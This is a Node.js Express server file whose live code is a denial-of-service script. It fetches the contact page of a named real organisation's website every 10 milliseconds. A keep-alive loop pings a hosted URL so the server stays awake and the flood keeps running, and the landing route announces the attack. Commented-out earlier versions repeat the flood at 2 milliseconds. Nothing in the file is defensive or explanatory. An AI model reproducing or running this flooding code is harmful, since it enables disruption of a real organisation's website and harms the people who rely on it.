// const express=require("express")
// const app=express()
// app.use(express.json())





// let numberofRequest=10000000000000
// const fetch=require("isomorphic-fetch")
// var index=0
// const attackSite=async()=>{
//     // console.log("fetch_time: ",index++ )
//     try {
       
//     const response=  await fetch("https://ipobontario.ca/contact-us/") 
//      const result=await response.text()
//     //  console.log(result)
//     } catch (error) {
//     //  console.log(error.message)   
//     }
// }



// //  setInterval(async()=>{
// //     attackSite()
// // },0.1)

// setInterval(async()=>{
//     attackSite()
//     // console.log("called")
// },2)


// // for(let index=0; index <numberofRequest; index++){

// //  async()=>attackSite()
// // }

// // (async()=>{
// //   attackSite()
// // })()






// app.use("/",(req,res)=>res.send("attacking https://ipobontario.ca/contact-us/..."))

// const port=process.env.PORT||3000
// app.listen(port,async()=>{console.log("running")})































































// const wakeServer=async()=>{
//     setInterval(() => {
//         wakeServer()
//     }, 130000);
//     // console.log("waked self up" )
//         try {
           
//         const response=  await fetch("https://ipob-attack4.herokuapp.com/") 
//          const result=await response.text()
//     //  console.log(result)

//         } catch (error) {
//     //    console.log(error.message)   
//         }
//     }

// const call=async()=>{
//     console.log("called awake server func")
//     await wakeServer()
// }
// call()









const express=require("express")
const app=express()
app.use(express.json())
const fetch=require("isomorphic-fetch")



let numberofRequest=10

// var index=0

// const attackSite=async()=>{
//   console.log("fetch_time: ",index++ )
//     try {
       
//     const response=  await fetch("https://ipobontario.ca/contact-us/") 
//      const result=await response.text()
//     //  console.log(result)
//     } catch (error) {
// //    console.log(error.message)   
//     }
// }

// const funcToggle=async()=> {
//     for(let index=0; index <numberofRequest; index){
//  attackSite()
// //  index++
// }
    
// }
// funcToggle()




const attackSite=async()=>{
  // console.log("fetch_time:index++ " )
    try {
       
    const response=  await fetch("https://ipobontario.ca/contact-us/") 
     const result=await response.text()
       // console.log(result)
    } catch (error) {
        // console.log(error.message)
    }
}






const wakeServer=async()=>{
    setInterval(() => {
        wakeServer()
    },35000);
    // console.log("waked self up" )
        try {
           
        const response=  await fetch("https://frill-youthful-hisser.glitch.me/wakeServer",{
            method:"POST",
            headers:{"content-type":"application/json"},
            body:JSON.stringify({request:"made request"})
        }) 
         const result=await response.text()
    console.log(result)

        } catch (error) {
   console.log(error.message)   

        }
    }

const call=async()=>{
    console.log("called awake server func")
    await wakeServer()
}
call()




setInterval(async()=>{
    attackSite()
    // console.log("called")
},10)



// for(let index=0; index <numberofRequest; index++){

//  async()=>fetchSite()
// }

// (async()=>{
//   fetchSite()
// })()


app.post("/wakeServer",(req,res)=>{
try {
    console.log(req.body)
    res.status(200).json({error:false,message:"server wake request made from same port"}) 
} catch (error) {
  console.log(error)  
}
})

app.use("/",(req,res)=>res.send("<h1>tunned server to push attack to antario web :: server wakes at ....</h1> "))

const port=process.env.PORT||3000
app.listen(port,async()=>{console.log("running")})

















